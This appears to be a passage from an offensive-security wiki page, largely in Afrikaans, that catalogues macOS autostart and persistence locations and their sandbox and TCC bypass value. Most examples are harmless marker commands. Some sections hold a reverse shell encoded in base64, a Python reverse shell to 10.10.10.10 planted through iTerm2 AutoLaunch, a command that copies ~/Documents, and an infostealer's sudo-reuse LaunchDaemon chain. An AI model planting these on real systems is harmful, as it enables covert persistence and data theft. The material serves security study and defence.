# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Hierdie afdeling is grootliks gebaseer op die blogreeks [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/); die doel is om **meer Autostart Locations** (indien moontlik) by te voeg, aan te dui **watter tegnieke** deesdae nog werk met die nuutste weergawe van macOS (13.4), en die nodige **permissions** te spesifiseer.

## Sandbox Bypass

> [!TIP]
> Hier kan jy start locations vind wat nuttig is vir **sandbox bypass**, wat jou toelaat om eenvoudig iets uit te voer deur dit **in 'n file te skryf** en te wag vir 'n baie **algemene** **aksie**, 'n bepaalde **tydperk** of 'n **aksie wat jy gewoonlik kan uitvoer** vanuit 'n sandbox sonder om root permissions te benodig.

### Launchd

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Herlaai
- Root required
- **`/Library/LaunchDaemons`**
- **Trigger**: Herlaai
- Root required
- **`/System/Library/LaunchAgents`**
- **Trigger**: Herlaai
- Root required
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Herlaai
- Root required
- **`~/Library/LaunchAgents`**
- **Trigger**: Her-aanmelding
- **`~/Library/LaunchDemons`**
- **Trigger**: Her-aanmelding

> [!TIP]
> As 'n interessante feit het **`launchd`** 'n ingebedde property list in die Mach-o-afdeling `__Text.__config`, wat ander bekende services bevat wat launchd moet start. Boonop kan hierdie services die `RequireSuccess`, `RequireRun` en `RebootOnSuccess` bevat, wat beteken dat hulle uitgevoer en suksesvol voltooi moet word.
>
> Natuurlik kan dit nie gewysig word nie weens code signing.

#### Description & Exploitation

**`launchd`** is die **eerste** **process** wat deur die OX S-kernel tydens startup uitgevoer word, en die laaste een wat tydens shutdown voltooi. Dit behoort altyd die **PID 1** te hê. Hierdie process sal die konfigurasies in die **ASEP** **plists** in die volgende locations **lees en uitvoer**:

- `/Library/LaunchAgents`: Per-user agents wat deur die admin geïnstalleer is
- `/Library/LaunchDaemons`: Stelselwye daemons wat deur die admin geïnstalleer is
- `/System/Library/LaunchAgents`: Per-user agents wat deur Apple voorsien word.
- `/System/Library/LaunchDaemons`: Stelselwye daemons wat deur Apple voorsien word.

Wanneer 'n gebruiker aanmeld, word die plists in `/Users/$USER/Library/LaunchAgents` en `/Users/$USER/Library/LaunchDemons` met die **aangemelde gebruiker se permissions** gestart.

Die **hoofverskil tussen agents en daemons is dat agents gelaai word wanneer die gebruiker aanmeld, terwyl daemons tydens system startup gelaai word** (aangesien daar services soos ssh is wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel verkry). Agents kan ook GUI gebruik, terwyl daemons in die agtergrond moet loop.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Daar is gevalle waar 'n **agent uitgevoer moet word voordat die gebruiker aanmeld**, en hierdie word **PreLoginAgents** genoem. Dit is byvoorbeeld nuttig om ondersteunende tegnologie tydens aanmelding te verskaf. Hulle kan ook in `/Library/LaunchAgents` gevind word (sien [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) 'n voorbeeld).

> [!TIP]
> Nuwe Daemons- of Agents-konfigurasielêers sal **na die volgende herlaai of met behulp van** `launchctl load <target.plist>` **gelaai word**. Dit is **ook moontlik om .plist-lêers sonder daardie uitbreiding te laai** met `launchctl -F <file>` (daardie plist-lêers sal egter nie outomaties ná 'n herlaai gelaai word nie).\
> Dit is ook moontlik om dit te **ontlaai** met `launchctl unload <target.plist>` (die proses waarna dit wys, sal beëindig word),
>
> Om te **verseker** dat daar nie **iets** (soos 'n **override**) is wat 'n **Agent** of **Daemon** **verhoed om** **te loop nie**, voer uit: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Lys al die agents en daemons wat deur die huidige gebruiker gelaai is:
```bash
launchctl list
```
#### Voorbeeld van kwaadwillige LaunchDaemon-ketting (wagwoordhergebruik)

'n Onlangse macOS-infostealer het 'n **gevange sudo-wagwoord** hergebruik om 'n user agent en 'n root LaunchDaemon te plaas:<sup>[1]</sup>

- Skryf die agent-lus na `~/.agent` en maak dit uitvoerbaar.
- Genereer 'n plist in `/tmp/starter` wat na daardie agent wys.
- Hergebruik die gesteelde wagwoord met `sudo -S` om dit na `/Library/LaunchDaemons/com.finder.helper.plist` te kopieer, stel `root:wheel` in, en laai dit met `launchctl load`.
- Begin die agent stilweg via `nohup ~/.agent >/dev/null 2>&1 &` om uitvoer te ontkoppel.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> As 'n plist deur 'n gebruiker besit word, selfs al is dit in daemon-stelselwye vouers, sal die **task as die gebruiker** en nie as root uitgevoer word nie. Dit kan sommige privilege escalation-aanvalle voorkom.

#### Meer inligting oor launchd

**`launchd`** is die **eerste** user mode-proses wat vanaf die **kernel** begin word. Die proses se begin moet **suksesvol** wees en dit **kan nie afsluit of crash nie**. Dit word selfs teen sommige **killing signals** **beskerm**.

Een van die eerste dinge wat `launchd` doen, is om al die **daemons** te **begin**, soos:

- **Timer daemons** gebaseer op die tyd waarop dit uitgevoer moet word:
- atd (`com.apple.atrun.plist`): Het 'n `StartInterval` van 30min
- crond (`com.apple.systemstats.daily.plist`): Het `StartCalendarInterval` om 00:15 te begin
- **Network daemons** soos:
- `org.cups.cups-lpd`: Luister op TCP (`SockType: stream`) met `SockServiceName: printer`
- SockServiceName moet óf 'n poort óf 'n service uit `/etc/services` wees
- `com.apple.xscertd.plist`: Luister op TCP-poort 1640
- **Path daemons** wat uitgevoer word wanneer 'n gespesifiseerde pad verander:
- `com.apple.postfix.master`: Kontroleer die pad `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Dit dui in die `MachServices`-inskrywing die naam `com.apple.xscertd.helper` aan
- **UserEventAgent:**
- Dit verskil van die vorige een. Dit laat launchd programme spawn in reaksie op spesifieke gebeurtenisse. In hierdie geval is die hoofbinary wat betrokke is egter nie `launchd` nie, maar `/usr/libexec/UserEventAgent`. Dit laai plugins uit die SIP-beperkte vouer /System/Library/UserEventPlugins/, waar elke plugin sy initialiser in die `XPCEventModuleInitializer`-sleutel aandui of, in die geval van ouer plugins, in die `CFPluginFactories`-dict onder die sleutel `FB86416D-6164-2070-726F-70735C216EC0` van sy `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet 'n app vind met 'n TCC bypass wat 'n shell uitvoer wat hierdie files laai

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Maak 'n terminal met zsh oop
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Maak 'n terminal met zsh oop
- Root required
- **`~/.zlogout`**
- **Trigger**: Verlaat 'n terminal met zsh
- **`/etc/zlogout`**
- **Trigger**: Verlaat 'n terminal met zsh
- Root required
- Potensieel meer in: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Maak 'n terminal met bash oop
- `/etc/profile` (het nie gewerk nie)
- `~/.profile` (het nie gewerk nie)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Daar word verwag dat dit met xterm geaktiveer word, maar dit **is nie geïnstalleer nie** en selfs nadat dit geïnstalleer is, word hierdie fout gewys: xterm: `DISPLAY is not set`<sup>[3]</sup>

#### Description & Exploitation

Wanneer 'n shell environment soos `zsh` of `bash` geïnisieer word, word **sekere startup files uitgevoer**. macOS gebruik tans `/bin/zsh` as die verstekshell. Hierdie shell word outomaties verkry wanneer die Terminal-toepassing geloods word of wanneer 'n toestel via SSH verkry word. Hoewel `bash` en `sh` ook in macOS teenwoordig is, moet hulle eksplisiet invoked word om dit te gebruik.<sup>[2]</sup>

Die man page van zsh, wat ons met **`man zsh`** kan lees, bevat 'n lang beskrywing van die startup files.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Heropende Applications

> [!CAUTION]
> Die opstel van die aangeduide exploitation en uit- en weer inlog, of selfs herlaai, het nie vir my gewerk om die app uit te voer nie. (Die app is nie uitgevoer nie; miskien moet dit loop wanneer hierdie aksies uitgevoer word.)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Sneller**: Herbegin en heropen van Applications

#### Beskrywing & Exploitation

Al die Applications wat heropen moet word, is binne die plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[4]</sup>

Om die heropen Applications jou eie een te laat launch, hoef jy net **jou app by die lys te voeg**.

Die UUID kan gevind word deur daardie gids te lys of met `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Om die Applications wat heropen sal word, na te gaan, kan jy doen:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Om **'n toepassing by hierdie lys te voeg**, kan jy gebruik maak van:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal gebruik om FDA permissions van die gebruiker te hê

#### Ligging

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Open Terminal

#### Beskrywing & Exploitation

In **`~/Library/Preferences`** word die gebruiker se preferences in die Applications gestoor. Sommige van hierdie preferences kan 'n configuration bevat om **ander applications/scripts uit te voer**.<sup>[5]</sup>

Byvoorbeeld, Terminal kan 'n command in die Startup uitvoer:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Hierdie config word soos volg in die file **`~/Library/Preferences/com.apple.Terminal.plist`** weerspieël:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Dus, indien die plist van die Terminal se preferences in die system oorskryf kon word, kan die **`open`** functionality gebruik word om **die terminal te open, en daardie command sal uitgevoer word**.

Jy kan dit vanaf die CLI byvoeg met:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Ander lêeruitbreidings

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal gebruik om FDA-permissies van die gebruiker te hê wat dit gebruik

#### Ligging

- **Enige plek**
- **Sneller**: Maak Terminal oop

#### Beskrywing & Exploitation

As jy ’n [**`.terminal`**-script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) skep en dit oopmaak, sal die **Terminal application** outomaties opgeroep word om die opdragte daarin uit te voer. As die Terminal app spesiale privileges het (soos TCC), sal jou opdrag met daardie spesiale privileges uitgevoer word.

Probeer dit met:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Jy kan ook die uitbreidings **`.command`**, **`.tool`** gebruik, met gewone shell scripts-inhoud, en hulle sal ook deur Terminal oopgemaak word.

> [!CAUTION]
> As Terminal **Full Disk Access** het, sal dit daardie aksie kan uitvoer (let daarop dat die uitgevoerde opdrag in 'n Terminal-venster sigbaar sal wees).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Jy kan dalk ekstra TCC-toegang kry

#### Ligging

- **`/Library/Audio/Plug-Ins/HAL`**
- Root word vereis
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`/Library/Audio/Plug-ins/Components`**
- Root word vereis
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Herbegin coreaudiod of die rekenaar
- **`/System/Library/Components`**
- Root word vereis
- **Trigger**: Herbegin coreaudiod of die rekenaar

#### Beskrywing

Volgens die vorige writeups is dit moontlik om **sommige audio plugins te compile** en hulle te laat laai.<sup>[6][7]</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Jy kan dalk ekstra TCC-toegang kry

#### Ligging

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beskrywing & Exploitation

QuickLook plugins kan uitgevoer word wanneer jy **die voorskou van 'n lêer aktiveer** (druk die spasiebalk terwyl die lêer in Finder gekies is) en 'n **plugin wat daardie lêertipe ondersteun** geïnstalleer is.<sup>[8]</sup>

Dit is moontlik om jou eie QuickLook plugin te compile, dit in een van die vorige liggings te plaas om dit te laai, en dan na 'n ondersteunde lêer te gaan en die spasiebalk te druk om dit te aktiveer.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Dit het nie vir my gewerk nie, nóg met die gebruiker se LoginHook nóg met die root LogoutHook.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Jy moet iets soos `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` kan uitvoer
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Hulle is deprecated, maar kan gebruik word om opdragte uit te voer wanneer 'n gebruiker aanmeld.<sup>[9]</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Hierdie instelling word gestoor in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Om dit te verwyder:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Die root-gebruiker s'n word in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** gestoor

## Conditional Sandbox Bypass

> [!TIP]
> Hier kan jy start locations vind wat nuttig is vir **sandbox bypass** en waarmee jy eenvoudig iets kan uitvoer deur dit **in 'n lêer te skryf** en **nie-superalgemene toestande te verwag** soos spesifieke **programme wat geïnstalleer is, "ongewone" gebruikerhandelinge** of omgewings.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Jy moet egter die `crontab`-binary kan uitvoer
- Of root wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root word benodig vir direkte skryftoegang. Geen root word benodig as jy `crontab <file>` kan uitvoer nie
- **Trigger**: Hang van die cron job af

#### Description & Exploitation

Lys die cron jobs van die **huidige gebruiker** met:
```bash
crontab -l
```
Jy kan ook al die cron jobs van die gebruikers in **`/usr/lib/cron/tabs/`** en **`/var/at/tabs/`** sien (benodig root).

In MacOS kan verskeie vouers wat scripts met **sekere frekwensie** uitvoer, gevind word in:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Daar kan jy die gewone **cron**-**take**, die **at**-**take** (nie baie gebruik nie) en die **periodic**-**take** (hoofsaaklik gebruik om tydelike lêers skoon te maak) vind. Die daaglikse periodic-take kan byvoorbeeld uitgevoer word met: `periodic daily`.<sup>[10]</sup>

Om ’n **user cronjob** programmaties by te voeg, is dit moontlik om:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 het voorheen toegekende TCC-toestemmings gehad

#### Ligginge

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: Open iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: Open iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: Open iTerm

#### Beskrywing & Exploitation

Scripts wat in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** gestoor word, sal uitgevoer word. Byvoorbeeld:<sup>[11]</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
of:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Die script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** sal ook uitgevoer word:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Die iTerm2-voorkeure, geleë in **`~/Library/Preferences/com.googlecode.iterm2.plist`**, kan **'n opdrag aandui om uit te voer** wanneer die iTerm2-terminaal oopgemaak word.

Hierdie instelling kan in die iTerm2-instellings gekonfigureer word:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

En die opdrag word in die voorkeure weerspieël:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Jy kan die command wat uitgevoer moet word, instel met:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Dit is hoogs waarskynlik dat daar **ander maniere is om die iTerm2-voorkeure te misbruik** om arbitrêre opdragte uit te voer.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar xbar moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit versoek Accessibility-toestemmings

#### Ligging

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Sodra xbar uitgevoer word

#### Beskrywing

As die gewilde program [**xbar**](https://github.com/matryer/xbar) geïnstalleer is, is dit moontlik om ’n shell script in **`~/Library/Application\ Support/xbar/plugins/`** te skryf wat uitgevoer sal word wanneer xbar gestart word:<sup>[12]</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- Maar Hammerspoon moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit versoek Accessibility-permissies

#### Ligging

- **`~/.hammerspoon/init.lua`**
- **Sneller**: Sodra hammerspoon uitgevoer word

#### Beskrywing

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as ’n outomatiseringsplatform vir **macOS**, wat die **LUA-skripttaal** vir sy bedrywighede gebruik. Dit ondersteun veral die integrasie van volledige AppleScript-kode en die uitvoering van shell scripts, wat sy scripting-vermoëns aansienlik uitbrei.<sup>[13]</sup>

Die toepassing soek na ’n enkele lêer, `~/.hammerspoon/init.lua`, en wanneer dit begin word, sal die script uitgevoer word.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- Maar BetterTouchTool moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit versoek Automation-Shortcuts- en Accessibility-toestemmings

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Hierdie tool laat jou toe om toepassings of scripts aan te dui wat uitgevoer moet word wanneer sekere shortcuts gedruk word. 'n Aanvaller kan moontlik sy eie **shortcut en aksie om in die databasis uit te voer** konfigureer, sodat arbitrêre code uitgevoer word ('n shortcut kan wees om bloot 'n sleutel te druk).

### Alfred

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- Maar Alfred moet geïnstalleer wees
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Dit versoek Automation-, Accessibility- en selfs Full-Disk Access-toestemmings

#### Location

- `???`

Dit laat jou toe om workflows te skep wat code kan uitvoer wanneer sekere voorwaardes nagekom word. Dit is moontlik dat 'n aanvaller 'n workflow-lêer kan skep en Alfred dit kan laat laai (dit is nodig om vir die premiumweergawe te betaal om workflows te gebruik).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- Maar ssh moet geaktiveer en gebruik word
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH word gebruik om FDA access te hê

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Login via ssh
- **`/etc/ssh/sshrc`**
- Root word vereis
- **Trigger**: Login via ssh

> [!CAUTION]
> Om ssh aan te skakel, vereis Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

By verstek, tensy `PermitUserRC no` in `/etc/ssh/sshd_config` gestel is, sal die scripts **`/etc/ssh/sshrc`** en **`~/.ssh/rc`** uitgevoer word wanneer 'n gebruiker **via SSH aanmeld**.<sup>[14]</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet `osascript` met args uitvoer
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- Exploit-payload gestoor wat **`osascript`** oproep
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root word vereis

#### Description

In System Preferences -> Users & Groups -> **Login Items** kan jy **items vind wat uitgevoer word wanneer die gebruiker aanmeld**.\
Dit is moontlik om hulle vanaf die command line te lys, by te voeg en te verwyder:<sup>[15]</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Hierdie items word in die lêer **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** gestoor.

**Login items** kan **ook aangedui word deur die API** [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), wat die konfigurasie in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** sal stoor.

### ZIP as Login Item

(Kyk na die vorige afdeling oor Login Items; dit is ’n uitbreiding)

As jy ’n **ZIP**-lêer as ’n **Login Item** stoor, sal die **`Archive Utility`** dit oopmaak. As die zip byvoorbeeld in **`~/Library`** gestoor is en die gids **`LaunchAgents/file.plist`** met ’n backdoor bevat, sal daardie gids geskep word (dit word nie by verstek geskep nie) en die plist sal bygevoeg word. Die volgende keer wat die gebruiker weer aanmeld, sal die **backdoor wat in die plist aangedui word, uitgevoer word**.

Nog ’n opsie sou wees om die lêers **`.bash_profile`** en **`.zshenv`** binne die gebruiker se HOME te skep, sodat hierdie tegniek steeds sal werk indien die gids LaunchAgents reeds bestaan.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- Maar jy moet **`at`** **uitvoer**, en dit moet **geaktiveer** wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Jy moet **`at`** **uitvoer**, en dit moet **geaktiveer** wees

